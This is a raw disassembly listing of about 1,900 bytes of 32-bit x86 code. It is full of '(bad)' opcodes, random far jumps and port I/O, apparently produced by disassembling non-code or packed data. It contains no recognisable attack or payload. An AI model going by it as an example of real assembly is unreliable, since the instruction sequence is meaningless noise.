  4236d1:	aam    0x93
  4236d3:	daa    
  4236d4:	outs   dx,BYTE PTR ds:[esi]
  4236d5:	aaa    
  4236d6:	icebp  
  4236d7:	pop    ss
  4236d8:	adc    al,0xe9
  4236da:	mov    esp,0x31199b63
  4236df:	bound  ebp,QWORD PTR ds:0x60daa58a
  4236e5:	sub    al,0x39
  4236e7:	push   esp
  4236e8:	xchg   esp,eax
  4236e9:	adc    edx,DWORD PTR [ecx-0x16]
  4236ec:	pop    ecx
  4236ed:	bound  esi,QWORD PTR [ecx+ecx*1]
  4236f0:	push   ss
  4236f1:	(bad)  
  4236f2:	mov    al,ds:0x5c439210
  4236f7:	clc    
  4236f8:	scas   al,BYTE PTR es:[edi]
  4236f9:	mov    cs,WORD PTR [ecx]
  4236fb:	fild   DWORD PTR [ebx]
  4236fd:	push   0x72f9928
  423702:	shl    DWORD PTR [eax+ecx*4+0x416c2da9],1
  423709:	pop    edx
  42370a:	and    eax,0xb3f2b246
  42370f:	daa    
  423710:	push   esi
  423711:	push   ds
  423712:	sbb    cl,BYTE PTR [ebx]
  423714:	pushf  
  423715:	or     dl,BYTE PTR [ebp-0x8]
  423718:	data16 (bad) 
  42371b:	push   esi
  42371c:	xor    esp,DWORD PTR [ebx+ebp*4]
  42371f:	dec    ecx
  423720:	inc    edi
  423721:	in     eax,0x15
  423723:	jns    0x4236c2
  423725:	call   0xd899:0x264a6865
  42372c:	mov    edx,0x998b3761
  423731:	call   0x356e:0x4c7e79a0
  423738:	mov    bl,0xc2
  42373a:	jns    0x423710
  42373c:	jno    0x423706
  42373e:	inc    ebx
  42373f:	jo     0x423798
  423741:	mov    bl,0x5a
  423743:	mov    al,0x30
  423745:	repz push 0xffffffc8
  423748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423749:	and    eax,0x69b8d894
  42374e:	in     al,0x86
  423750:	js     0x4237b3
  423752:	std    
  423753:	outs   dx,DWORD PTR ds:[esi]
  423754:	jmp    0xa123:0xb2bb2fc3
  42375b:	fimul  DWORD PTR [edi+0x18]
  42375e:	push   ecx
  42375f:	add    bh,ch
  423761:	pop    ecx
  423762:	cmp    eax,0xc08e984e
  423767:	push   eax
  423768:	adc    BYTE PTR [ebx+0x4e7a3619],bl
  42376e:	dec    edi
  42376f:	int3   
  423770:	or     eax,0xc9a41b7e
  423775:	daa    
  423776:	mov    dl,0x6f
  423778:	ret    
  423779:	repz in eax,0xcd
  42377c:	cmp    DWORD PTR es:[ebp+0x37],eax
  423780:	outs   dx,DWORD PTR ds:[esi]
  423781:	mov    dh,0xc7
  423783:	and    BYTE PTR [esi-0x51247ba0],al
  423789:	dec    ebx
  42378a:	xchg   ecx,eax
  42378b:	(bad)  
  42378c:	out    0xf1,al
  42378e:	(bad)  
  42378f:	aam    0x0
  423791:	lods   al,BYTE PTR ds:[esi]
  423792:	lods   eax,DWORD PTR ds:[esi]
  423793:	pop    ecx
  423794:	dec    esi
  423795:	or     ah,cl
  423797:	jmp    0x627f:0x6c85eaea
  42379e:	mov    bh,0x15
  4237a0:	leave  
  4237a1:	ins    BYTE PTR es:[edi],dx
  4237a2:	inc    ecx
  4237a3:	nop
  4237a4:	out    dx,eax
  4237a5:	les    esp,FWORD PTR [eax-0x4a]
  4237a8:	sbb    ch,ah
  4237aa:	test   al,0x9d
  4237ac:	out    0x7f,eax
  4237ae:	push   0xfffffff7
  4237b0:	dec    esp
  4237b1:	jnp    0x4237fe
  4237b3:	and    BYTE PTR [ecx-0x1a],dl
  4237b6:	out    0x90,al
  4237b8:	lahf   
  4237b9:	mov    dl,0x87
  4237bb:	sbb    DWORD PTR [eax+edx*8-0x4bdbc1c8],edx
  4237c2:	mov    DWORD PTR [ebp-0x6024c5d6],ecx
  4237c8:	sbb    al,0x67
  4237ca:	jecxz  0x42383b
  4237cc:	into   
  4237cd:	mov    esp,0xaafd57f6
  4237d2:	xchg   esp,eax
  4237d3:	es cmp al,0x62
  4237d6:	mov    DWORD PTR [esi+0x45c76f16],esp
  4237dc:	sbb    eax,0xe29649df
  4237e1:	push   esi
  4237e2:	jb     0x42380d
  4237e4:	xchg   DWORD PTR [eax],ebp
  4237e6:	nop
  4237e7:	loope  0x4237d3
  4237e9:	sub    esi,DWORD PTR [ecx+0x166d0ba]
  4237ef:	add    bh,BYTE PTR [ebx+0x28]
  4237f2:	scas   eax,DWORD PTR es:[edi]
  4237f3:	pop    eax
  4237f4:	push   ebx
  4237f5:	pop    ds
  4237f6:	jae    0x4237e8
  4237f8:	sbb    eax,0x82f2a3a9
  4237fd:	xor    al,0x1c
  4237ff:	or     dh,ah
  423801:	push   edi
  423802:	xchg   edx,eax
  423803:	(bad)  [esi+0x4f]
  423806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423807:	pop    ecx
  423808:	ja     0x423811
  42380a:	mov    ebx,0xb1e73d21
  42380f:	xor    BYTE PTR [esi-0xe],0x1e
  423813:	fisttp DWORD PTR [eax]
  423815:	ror    DWORD PTR [edi+eiz*1+0x2b],cl
  423819:	jne    0x423830
  42381b:	mov    cl,0x5a
  42381d:	add    cl,ch
  42381f:	adc    eax,DWORD PTR [edi+ecx*4-0x1e]
  423823:	and    DWORD PTR [ebp-0x3e],ebp
  423826:	adc    al,ch
  423828:	cmc    
  423829:	out    dx,al
  42382a:	push   ds
  42382b:	and    DWORD PTR [edx-0x23],edx
  42382e:	addr16 repz xchg esp,eax
  423831:	cld    
  423832:	retf   
  423833:	enter  0xef3d,0x84
  423837:	(bad)  
  423838:	push   eax
  423839:	adc    edx,DWORD PTR [eax-0x24f4400]
  42383f:	mov    eax,ds:0x2faea64b
  423844:	std    
  423845:	and    ah,BYTE PTR [edi]
  423847:	or     al,BYTE PTR [ebx-0x715fbd7a]
  42384d:	mov    ds:0xb5dae4f8,al
  423852:	dec    ebp
  423853:	add    DWORD PTR [ecx+edi*2+0x4d],ebp
  423857:	fst    DWORD PTR [edi]
  423859:	xor    eax,0xf5c65bee
  42385e:	sub    BYTE PTR cs:[ecx],bl
  423861:	sbb    BYTE PTR [eax],ah
  423863:	jnp    0x4238b9
  423865:	lods   al,BYTE PTR ds:[esi]
  423866:	sub    al,0x4d
  423868:	xor    DWORD PTR [edi+0x29ffda83],edx
  42386e:	es clc 
  423870:	xchg   edx,eax
  423871:	sbb    bl,BYTE PTR [esi+eiz*4]
  423874:	jae    0x4238bd
  423876:	xchg   edx,eax
  423877:	mov    DWORD PTR [ebp-0x4dd0a3e],ebx
  42387d:	imul   ecx,DWORD PTR [eax-0x7dfac8f9],0xfffffff4
  423884:	mov    BYTE PTR [ecx+0x79],ch
  423887:	(bad)  
  423888:	push   edx
  423889:	lds    ebx,FWORD PTR [edi]
  42388b:	adc    al,0xd2
  42388d:	jo     0x423885
  42388f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423890:	lods   eax,DWORD PTR ds:[esi]
  423891:	arpl   WORD PTR [ebp+0x44],di
  423894:	dec    ebp
  423895:	push   0xffffffc6
  423897:	loop   0x4238d1
  423899:	mov    esp,0xb4576675
  42389e:	push   edx
  42389f:	dec    ebp
  4238a0:	ret    
  4238a1:	ror    BYTE PTR [ecx],1
  4238a3:	loope  0x4238d3
  4238a5:	jmp    0x423860
  4238a7:	movups xmm1,XMMWORD PTR [ecx-0x7e]
  4238ab:	xchg   BYTE PTR [esp+eiz*2+0x4c3d771a],dl
  4238b2:	out    dx,al
  4238b3:	mov    dl,0xfd
  4238b5:	cwde   
  4238b6:	stos   DWORD PTR es:[edi],eax
  4238b7:	add    BYTE PTR [ebp+0x2d5f54ce],ch
  4238bd:	popf   
  4238be:	cs mov ebp,0xbe6a27ed
  4238c4:	arpl   WORD PTR [ecx-0x5],bx
  4238c7:	adc    eax,esi
  4238c9:	test   eax,0x48b89a9f
  4238ce:	je     0x423861
  4238d0:	xchg   esp,eax
  4238d1:	push   es
  4238d2:	dec    eax
  4238d3:	or     ax,0x53c
  4238d7:	bound  edi,QWORD PTR [esi+eiz*1-0x5b]
  4238db:	xchg   esp,eax
  4238dc:	push   ebp
  4238dd:	test   eax,0x103506cb
  4238e2:	jae    0x423891
  4238e4:	repnz std 
  4238e6:	sbb    eax,0x82ef8ecc
  4238eb:	jg     0x4238bb
  4238ed:	push   0x73
  4238ef:	pop    ss
  4238f0:	hlt    
  4238f1:	mov    DWORD PTR [ecx],ebp
  4238f3:	out    0xe5,eax
  4238f5:	cdq    
  4238f6:	hlt    
  4238f7:	xlat   BYTE PTR ds:[ebx]
  4238f8:	xor    ah,BYTE PTR [esi]
  4238fa:	sbb    ebx,edx
  4238fc:	cs dec eax
  4238fe:	xor    dl,BYTE PTR [ebp-0x43b10dc]
  423904:	push   edx
  423905:	test   eax,0xf271e8be
  42390a:	rcr    BYTE PTR [ebx-0x73],cl
  42390d:	xor    ecx,edi
  42390f:	mov    ebx,0x963b49d0
  423914:	push   ebx
  423915:	fidivr WORD PTR [edx-0x9]
  423918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423919:	mov    ds:0xdb919cc7,eax
  42391e:	nop
  42391f:	shl    DWORD PTR [ecx],cl
  423921:	(bad)  
  423922:	dec    BYTE PTR [ebx+0x47]
  423925:	and    al,0xf3
  423927:	jle    0x423908
  423929:	(bad)  
  42392a:	jge    0x423955
  42392c:	push   es
  42392d:	mov    ch,0xa
  42392f:	rol    BYTE PTR [ebp+0x3b],cl
  423932:	xchg   DWORD PTR [eax-0xe1c096a],edi
  423938:	(bad)
  42393c:	xlat   BYTE PTR ds:[ebx]
  42393d:	cli    
  42393e:	xchg   ebp,eax
  42393f:	mov    ch,0x11
  423941:	out    0xee,al
  423943:	add    BYTE PTR [edx+0x4d],al
  423946:	in     eax,0xce
  423948:	adc    ah,bh
  42394a:	dec    esp
  42394b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42394c:	or     bh,BYTE PTR [eax+0x35]
  42394f:	pop    edx
  423950:	dec    ecx
  423951:	mov    cl,0x12
  423953:	jg     0x4239a7
  423955:	mov    ecx,0x496ce07c
  42395a:	seto   BYTE PTR [ecx-0x12748e30]
  423961:	in     al,dx
  423962:	rcl    DWORD PTR [edx-0x5b],cl
  423965:	scas   eax,DWORD PTR es:[edi]
  423966:	xor    al,0x8f
  423968:	leave  
  423969:	lods   eax,DWORD PTR ds:[esi]
  42396a:	mov    ds:0xa8a00f18,al
  42396f:	pusha  
  423970:	sbb    ch,BYTE PTR [edi]
  423972:	xchg   esi,eax
  423973:	ja     0x42399e
  423975:	fdivrp st(3),st
  423977:	inc    edi
  423978:	inc    eax
  423979:	jae    0x4239e4
  42397b:	push   0x67c0a029
  423980:	xchg   esi,eax
  423981:	xchg   ebx,eax
  423982:	mov    ch,0x5d
  423984:	pop    edi
  423985:	out    dx,al
  423986:	push   es
  423987:	or     DWORD PTR [ebx],edx
  423989:	das    
  42398a:	scas   al,BYTE PTR es:[edi]
  42398b:	jnp    0x423985
  42398d:	cmp    DWORD PTR [ebx+0x20d1140b],edx
  423993:	cdq    
  423994:	fidiv  WORD PTR [eax+0x52f7df1]
  42399a:	jmp    0x4239d6
  42399c:	pop    esi
  42399d:	in     al,0x4c
  42399f:	js     0x4239c2
  4239a1:	test   eax,0x6d2d5469
  4239a6:	ss (bad) 
  4239a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239a9:	inc    esi
  4239aa:	es aad 0x1
  4239ad:	test   DWORD PTR [edx-0x72f4d2e1],ebx
  4239b3:	out    dx,al
  4239b4:	dec    esi
  4239b5:	cmp    ebx,esi
  4239b7:	in     al,0xf
  4239b9:	cmp    BYTE PTR ds:0xd9b1fb83,ch
  4239bf:	xor    eax,0xb298d1cd
  4239c4:	cli    
  4239c5:	pop    ds
  4239c6:	neg    DWORD PTR [ecx-0x66]
  4239c9:	test   DWORD PTR [ebp-0x58e77f2f],esp
  4239cf:	mov    bh,0xcd
  4239d1:	aas    
  4239d2:	xor    eax,0xf34f935b
  4239d7:	dec    ecx
  4239d8:	dec    esi
  4239d9:	xchg   DWORD PTR [edi],ebp
  4239db:	scas   al,BYTE PTR es:[edi]
  4239dc:	(bad)  
  4239dd:	adc    al,0x69
  4239df:	mov    eax,ds:0xf95aa8df
  4239e4:	mov    eax,0xb8c8ed57
  4239e9:	mov    WORD PTR [ebp-0x54],gs
  4239ec:	outs   dx,BYTE PTR ds:[esi]
  4239ed:	mov    al,0xc6
  4239ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239f0:	fimul  DWORD PTR [eax]
  4239f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239f3:	mov    ch,ch
  4239f5:	dec    edi
  4239f6:	daa    
  4239f7:	sub    bl,BYTE PTR [edx+0x51571459]
  4239fd:	mov    edi,0xa5fd14a7
  423a02:	retf   0x29fb
  423a05:	int    0xc0
  423a07:	inc    edi
  423a08:	xor    edx,edx
  423a0a:	popf   
  423a0b:	sbb    DWORD PTR [ecx-0x6b52fd78],0x915e85f6
  423a15:	(bad)  
  423a17:	xor    ch,BYTE PTR [edi]
  423a19:	pop    edx
  423a1a:	(bad)  
  423a1b:	loopne 0x423a23
  423a1d:	cld    
  423a1e:	or     eax,DWORD PTR [ebp+0x31]
  423a21:	test   BYTE PTR [eax+0x39d059ad],dl
  423a27:	das    
  423a28:	inc    ebp
  423a29:	pop    ebp
  423a2a:	inc    ebx
  423a2b:	pop    edx
  423a2c:	(bad)  
  423a2d:	cmp    al,0xa9
  423a2f:	sbb    BYTE PTR [edi+0x107296a3],bl
  423a35:	sub    dl,BYTE PTR [edx-0x28]
  423a38:	cmp    ch,bl
  423a3a:	jae    0x423a92
  423a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a3d:	push   ds
  423a3e:	push   ss
  423a3f:	data16 ror BYTE PTR [edx+0x2f],0xd3
  423a44:	cmp    BYTE PTR [ecx-0x2b],al
  423a47:	fnsave [esi+eiz*8]
  423a4a:	xchg   ebp,edx
  423a4c:	jno    0x423a44
  423a4e:	imul   DWORD PTR [ebx+0x36e1c2c9]
  423a54:	test   edi,esp
  423a56:	out    dx,al
  423a57:	pop    es
  423a58:	add    al,0x10
  423a5a:	dec    eax
  423a5b:	sbb    ah,BYTE PTR [ebp+0x795ee777]
  423a61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a62:	mov    cl,0xda
  423a64:	mov    eax,ds:0x94601912
  423a69:	mov    dh,0x15
  423a6b:	pop    edx
  423a6c:	xchg   ecx,eax
  423a6d:	inc    ebx
  423a6e:	or     al,0xcb
  423a70:	xor    al,0xa7
  423a72:	aaa    
  423a73:	push   esi
  423a74:	mov    gs,WORD PTR [eax+esi*2+0xb]
  423a78:	aaa    
  423a79:	mov    bl,0xcb
  423a7b:	popa   
  423a7c:	mov    DWORD PTR [ecx+0x481cc0bc],ebp
  423a82:	add    eax,0x8fbbdbd7
  423a87:	adc    BYTE PTR [eax+0x16],dh
  423a8a:	mov    edi,0x86ac55d6
  423a8f:	nop
  423a90:	xchg   esi,eax
  423a91:	fdiv   st,st(6)
  423a93:	ds xchg ebx,eax
  423a95:	repz aaa 
  423a97:	aam    0x6b
  423a99:	dec    ecx
  423a9a:	leave  
  423a9b:	pop    edx
  423a9c:	or     DWORD PTR [ebx],ebx
  423a9e:	dec    esp
  423a9f:	or     DWORD PTR [edx+0x2b2bb5b8],eax
  423aa5:	mov    ecx,0x2b92b3e1
  423aaa:	sahf   
  423aab:	in     eax,dx
  423aac:	iret   
  423aad:	mov    BYTE PTR ds:0xf48d3de4,bh
  423ab3:	mov    WORD PTR [esi-0x36],?
  423ab6:	push   edi
  423ab7:	and    eax,0x2478fa89
  423abc:	and    ecx,DWORD PTR [ecx+0x164b7387]
  423ac2:	daa    
  423ac3:	mov    ds:0xab2a05fc,eax
  423ac8:	inc    eax
  423ac9:	mov    ecx,0x5d2a163b
  423ace:	ja     0x423b03
  423ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ad1:	xchg   BYTE PTR gs:[eax+0xb],cl
  423ad5:	ror    DWORD PTR [edx-0x72],cl
  423ad8:	test   DWORD PTR [eax+0x34f2e7f6],0x446ad566
  423ae2:	push   cs
  423ae3:	mov    DWORD PTR [ebp-0xb912e89],ecx
  423ae9:	cmp    al,0xaa
  423aec:	xor    esi,0xffffff91
  423aef:	adc    al,0x68
  423af1:	push   0x672b9676
  423af6:	ret    
  423af7:	call   0x2439bc4f
  423afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423afd:	mov    BYTE PTR [ecx-0x60],ch
  423b00:	add    al,0x31
  423b02:	test   eax,0x15bd0afd
  423b08:	ins    DWORD PTR es:[edi],dx
  423b09:	push   ebp
  423b0a:	or     al,0x30
  423b0c:	xor    eax,0xcbf16449
  423b11:	pop    eax
  423b12:	lods   al,BYTE PTR ds:[esi]
  423b13:	(bad)  
  423b14:	cs sub eax,0x8edbef6e
  423b1a:	leave  
  423b1b:	add    cl,dh
  423b1d:	arpl   dx,dx
  423b1f:	mov    edi,0x975be1e1
  423b24:	jno    0x423b3d
  423b26:	xchg   ebp,eax
  423b27:	mov    edx,0x1d4285a0
  423b2c:	jnp    0x423b10
  423b2e:	retf   
  423b2f:	das    
  423b30:	das    
  423b31:	outs   dx,DWORD PTR ds:[esi]
  423b32:	mov    edi,DWORD PTR [esi+0x3b4e22d1]
  423b38:	scas   eax,DWORD PTR es:[edi]
  423b39:	push   cs
  423b3a:	and    eax,0x32eadec5
  423b3f:	pop    ebp
  423b40:	outs   dx,BYTE PTR ds:[esi]
  423b41:	fcmovb st,st(7)
  423b43:	xor    DWORD PTR [edx],eax
  423b45:	sbb    ch,BYTE PTR [edx-0x56]
  423b48:	mov    esi,DWORD PTR [esi+0xf1207ab]
  423b4e:	cmc    
  423b4f:	pop    es
  423b50:	jne    0x423afe
  423b52:	into   
  423b53:	cmp    esi,DWORD PTR [edi-0x6197c554]
  423b59:	pop    esp
  423b5a:	inc    edx
  423b5b:	add    DWORD PTR [ebx],0xed73f310
  423b61:	sbb    BYTE PTR [edx],cl
  423b63:	scas   al,BYTE PTR es:[edi]
  423b64:	xchg   ebx,eax
  423b65:	rcl    DWORD PTR [ebx+0x6b],0x9e
  423b69:	pop    ebx
  423b6a:	rcr    BYTE PTR [eax],cl
  423b6c:	xor    ebx,ecx
  423b6e:	adc    al,0xc6
  423b70:	jnp    0x423b27
  423b72:	out    0x5,al
  423b74:	mov    ch,0x71
  423b76:	pop    esi
  423b77:	lods   eax,DWORD PTR ds:[esi]
  423b78:	adc    eax,0xf65c81b9
  423b7d:	in     eax,dx
  423b7e:	cmp    bh,BYTE PTR [ecx+0x1324b6f7]
  423b84:	pushf  
  423b85:	and    BYTE PTR [ebp+ebp*4+0x147e0d21],bl
  423b8c:	fwait
  423b8d:	ins    BYTE PTR es:[edi],dx
  423b8e:	and    edx,DWORD PTR [edx]
  423b90:	xchg   BYTE PTR [esp+ebx*8],bl
  423b93:	mov    eax,0x7ca039c2
  423b98:	ins    BYTE PTR es:[edi],dx
  423b99:	pop    esi
  423b9a:	ja     0x423bf3
  423b9c:	add    DWORD PTR [ebx-0x73b1bd5d],esi
  423ba2:	xchg   ecx,eax
  423ba3:	fisttp QWORD PTR [ebx-0x30]
  423ba6:	pushf  
  423ba7:	push   es
  423ba8:	sbb    WORD PTR [ebx+0x5f628f11],bp
  423baf:	cld    
  423bb0:	pop    ss
  423bb1:	pushf  
  423bb2:	retf   
  423bb3:	ins    BYTE PTR es:[edi],dx
  423bb4:	push   edx
  423bb5:	test   ah,0x9a
  423bb8:	outs   dx,DWORD PTR ds:[esi]
  423bb9:	cmp    BYTE PTR [eax+eax*2+0x56],dl
  423bbd:	mov    al,0x13
  423bbf:	cmp    al,0x21
  423bc1:	outs   dx,DWORD PTR ds:[esi]
  423bc2:	retf   0x23e3
  423bc5:	dec    ecx
  423bc6:	outs   dx,BYTE PTR ds:[esi]
  423bc7:	jg     0x423bbf
  423bc9:	(bad)  
  423bca:	cmc    
  423bcb:	ret    0xe7e8
  423bce:	push   es
  423bcf:	repnz (bad) 
  423bd1:	ins    BYTE PTR es:[edi],dx
  423bd2:	adc    DWORD PTR [esi],edi
  423bd4:	jecxz  0x423bf1
  423bd6:	shl    DWORD PTR [esi],cl
  423bd8:	inc    eax
  423bd9:	loope  0x423c2b
  423bdb:	out    dx,al
  423bdc:	cdq    
  423bdd:	neg    DWORD PTR [ebx-0x4b3bb657]
  423be3:	fisttp QWORD PTR ss:[esi+0xb]
  423be7:	inc    edi
  423be8:	cli    
  423be9:	mov    ecx,0x97ac2ab6
  423bee:	jecxz  0x423c36
  423bf0:	mov    WORD PTR [eax+0x46bcf821],gs
  423bf6:	mov    ds:0xbe1bc610,eax
  423bfb:	pop    es
  423bfc:	xchg   esi,eax
  423bfd:	ins    DWORD PTR es:[edi],dx
  423bfe:	cs jmp 0xd384:0x10aff277
  423c06:	push   es
  423c07:	mov    ecx,0x68da77ca
  423c0c:	in     al,0xf4
  423c0e:	in     eax,0x3e
  423c10:	(bad)  
  423c11:	sub    BYTE PTR [ecx],cl
  423c13:	stos   BYTE PTR es:[edi],al
  423c14:	push   edx
  423c15:	shr    DWORD PTR [edi+0xc],1
  423c18:	mov    al,ds:0x9f96ab80
  423c1d:	jecxz  0x423bdc
  423c1f:	jno    0x423c5f
  423c21:	and    DWORD PTR [eax-0x1d],edi
  423c24:	add    DWORD PTR [ebp-0x2190a388],esp
  423c2a:	mov    ecx,0xb65ea70e
  423c2f:	scas   eax,DWORD PTR es:[edi]
  423c30:	pop    edi
  423c31:	sar    BYTE PTR [ebp+0x4ac214d9],1
  423c37:	and    bh,ah
  423c39:	retf   
  423c3a:	push   es
  423c3b:	bound  edi,QWORD PTR [ecx+0x2d64fe90]
  423c41:	inc    ebp
  423c42:	rcl    DWORD PTR [ecx-0x5f360a3f],1
  423c48:	loope  0x423cb7
  423c4a:	jb     0x423c7c
  423c4c:	loope  0x423be6
  423c4e:	dec    ebx
  423c4f:	xor    BYTE PTR [edx+0x64f69d16],al
  423c55:	in     al,dx
  423c56:	(bad)  
  423c57:	mov    es,ebp
  423c59:	out    dx,al
  423c5a:	mov    ecx,DWORD PTR [ebx]
  423c5c:	stos   DWORD PTR es:[edi],eax
  423c5d:	icebp  
  423c5e:	cmp    DWORD PTR [ebp-0x17],edx
  423c61:	sub    ah,al
  423c63:	inc    edx
  423c64:	push   edi
  423c65:	add    eax,0xacb45fbc
  423c6a:	cmp    BYTE PTR [esi-0x2a09a651],al
  423c70:	pop    ss
  423c71:	xchg   esp,eax
  423c72:	(bad)  
  423c73:	push   0xbf7829ac
  423c78:	adc    eax,0xf83984c9
  423c7d:	mov    al,ds:0x9c1e40b2
  423c82:	test   DWORD PTR [edi+0x65],ebx
  423c85:	mov    DWORD PTR [esp],ebx
  423c88:	dec    esp
  423c89:	cld    
  423c8a:	pop    ss
  423c8b:	mov    eax,ds:0x8de10578
  423c90:	mov    esp,0xa8a9c1a5
  423c95:	add    DWORD PTR [esi-0x6a436ed0],esi
  423c9b:	xor    edi,ebx
  423c9d:	jns    0x423c3b
  423c9f:	jp     0x423c83
  423ca1:	inc    eax
  423ca2:	dec    ecx
  423ca3:	adc    BYTE PTR [eax-0x691dcba],0xef
  423caa:	rcl    DWORD PTR [eax+0x477d328b],cl
  423cb0:	dec    esi
  423cb1:	or     ah,BYTE PTR [ebx]
  423cb3:	lahf   
  423cb4:	push   0xffffffcd
  423cb6:	mov    ds:0x9ad57a53,al
  423cbb:	mov    esp,0xe5ebb231
  423cc0:	rcl    BYTE PTR [edx+esi*1],1
  423cc3:	cmc    
  423cc4:	xor    esi,ebx
  423cc6:	dec    ebp
  423cc7:	jmp    0x4783b403
  423ccc:	idiv   BYTE PTR [edx+0x7e]
  423ccf:	xor    al,0x76
  423cd1:	mov    eax,0x2d2937b7
  423cd6:	repz stc 
  423cd8:	scas   al,BYTE PTR es:[edi]
  423cd9:	neg    ch
  423cdb:	es xchg ebx,eax
  423cdd:	scas   al,BYTE PTR es:[edi]
  423cde:	mov    ecx,0x23ba36d6
  423ce3:	adc    eax,0x6e68fe0d
  423ce8:	cmp    eax,0x6e48c7ce
  423ced:	xor    BYTE PTR [edx],bh
  423cef:	lds    edx,FWORD PTR [eax]
  423cf1:	inc    BYTE PTR [eax+0x7c]
  423cf4:	imul   ecx,DWORD PTR [ecx],0xffffffc9
  423cf7:	dec    eax
  423cf8:	fcom   QWORD PTR [eax]
  423cfa:	sub    DWORD PTR [ebp-0x461132df],esi
  423d00:	outs   dx,DWORD PTR ds:[esi]
  423d01:	das    
  423d02:	test   BYTE PTR [edx],al
  423d04:	out    0x74,al
  423d06:	mov    DWORD PTR ds:0xc7516b1f,edx
  423d0c:	mov    BYTE PTR ds:0x3cf4d974,bl
  423d12:	inc    edx
  423d13:	and    dl,BYTE PTR [edi+0x3a65d75a]
  423d19:	pop    edi
  423d1a:	inc    esp
  423d1b:	mov    esi,DWORD PTR [esi+0x687459e3]
  423d21:	bound  ebx,QWORD PTR ss:[ebp+0x55751c1d]
  423d28:	add    BYTE PTR [eax],al
  423d2a:	inc    esp
  423d2b:	push   edx
  423d2c:	push   edi
  423d2d:	push   ebp
  423d2e:	push   edi
  423d2f:	push   ebp
  423d30:	inc    esi
  423d31:	push   ebx
  423d32:	test   BYTE PTR [eax-0x5db70192],ah
  423d38:	aad    0x21
  423d3a:	cwde   
  423d3b:	retf   
  423d3c:	add    DWORD PTR [eax],eax
  423d3e:	xchg   BYTE PTR [esi],al
  423d40:	add    BYTE PTR [eax],al
  423d42:	ins    DWORD PTR es:[edi],dx
  423d43:	pop    ecx
  423d44:	outs   dx,DWORD PTR ds:[esi]
  423d45:	jp     0x423cf2
  423d47:	inc    edi
  423d48:	test   ebp,eax
  423d4a:	rcr    BYTE PTR [edx+0x22b1fac],1
  423d50:	and    dh,BYTE PTR [eax]
  423d52:	mov    bh,BYTE PTR [edi-0x7786a4a8]
  423d58:	inc    edx
  423d59:	mov    WORD PTR [ebx-0x63],cs
  423d5c:	push   ebx
  423d5d:	(bad)  
  423d5e:	scas   eax,DWORD PTR es:[edi]
  423d5f:	test   eax,0x39f790ea
  423d64:	imul   edx,ebp,0x4b1b392e
  423d6a:	sub    eax,DWORD PTR [ebp+0x6f]
  423d6d:	cli    
  423d6e:	mov    dl,0x17
  423d70:	mov    cl,0xd
  423d72:	sti    
  423d73:	lock in eax,dx
  423d75:	push   0xb9cd3738
  423d7a:	pop    edx
  423d7b:	loopne 0x423d06
  423d7d:	pop    eax
  423d7e:	add    edx,DWORD PTR [ebp+0x2c]
  423d81:	add    ah,BYTE PTR [ecx+ecx*8-0x7f6a1aa1]
  423d88:	or     al,BYTE PTR [ebx]
  423d8a:	inc    eax
  423d8b:	or     BYTE PTR [edi+0x30],0x99
  423d8f:	xor    DWORD PTR [eax-0x3f],eax
  423d92:	xor    bl,BYTE PTR [edx-0x5a]
  423d95:	xchg   edx,eax
  423d96:	push   ebx
  423d97:	icebp  
  423d98:	add    DWORD PTR [ebx-0x80],eax
  423d9b:	push   ebp
  423d9c:	outs   dx,DWORD PTR ds:[esi]
  423d9d:	stc    
  423d9e:	mov    al,0xf8
  423da0:	adc    eax,0x3592a89d
  423da5:	mov    eax,ds:0xba0d2b3e
  423daa:	sub    BYTE PTR [eax+0x6f],dl
  423dad:	mov    BYTE PTR [esi+0x5d3baf78],dl
  423db3:	push   es
  423db4:	scas   eax,DWORD PTR es:[edi]
  423db5:	push   esp
  423db6:	mov    eax,ds:0x29e27e34
  423dbb:	sub    eax,0x563fef94
  423dc0:	ret    0xd11f
  423dc3:	inc    ebx
  423dc4:	add    al,0x35
  423dc6:	sbb    BYTE PTR [eax],bh
  423dc8:	cdq    
  423dc9:	xor    DWORD PTR [edi],ebx
  423dcb:	retf   
  423dcc:	pop    ss
  423dcd:	out    0x50,eax
  423dcf:	scas   eax,DWORD PTR es:[edi]
  423dd0:	imul   DWORD PTR [eax+ebx*4+0x5e71eed1]
  423dd7:	push   ecx
  423dd8:	jmp    0xed437158
  423ddd:	cs inc eax
  423ddf:	push   eax
  423de0:	xor    dh,BYTE PTR [ebp+0x61]
  423de3:	xor    bh,dh
  423de5:	bound  ebp,QWORD PTR [ecx+0x78]
  423de8:	push   ecx
  423de9:	popf   
  423dea:	gs jmp 0x5223:0x4ac76dd6
  423df2:	ret    0xfa11
  423df5:	ins    BYTE PTR es:[edi],dx
  423df6:	push   ss
  423df7:	add    BYTE PTR [ebx-0x26d37],dh
  423dfd:	leave  
  423dfe:	pushf  
  423dff:	rcl    DWORD PTR [edi-0x722770ba],0xda
  423e06:	and    al,0x2f
  423e08:	nop
  423e09:	aas    
  423e0a:	or     ch,BYTE PTR [eax]
  423e0c:	and    bh,BYTE PTR [edx-0x100a39c7]
  423e12:	pop    ecx
  423e13:	repz dec edi
  423e15:	jae    0x423d9a
  423e17:	mov    al,0xfb
  423e19:	mov    eax,0xdfd3c575
  423e1e:	aas    
  423e1f:	out    0x6d,eax
  423e21:	test   al,0x9a
  423e23:	inc    esp
  423e24:	rcl    DWORD PTR [ebp-0x45],0x5f
  423e28:	fstp   TBYTE PTR [ebx+0xb139a7e]
  423e2e:	mov    edx,0xa1e93021
  423e33:	cdq    
  423e34:	fdiv   QWORD PTR [esi-0x23fdf77e]
  423e3a:	pop    DWORD PTR [ecx+0xa]
  423e3d:	dec    ecx
  423e3e:	syscall 
  423e40:	and    al,0x4d
  423e42:	and    dh,BYTE PTR [edi+0x7ce6d1aa]
  423e48:	stc    
  423e49:	les    esi,FWORD PTR [edx-0x68bac4d6]
  423e4f:	push   es
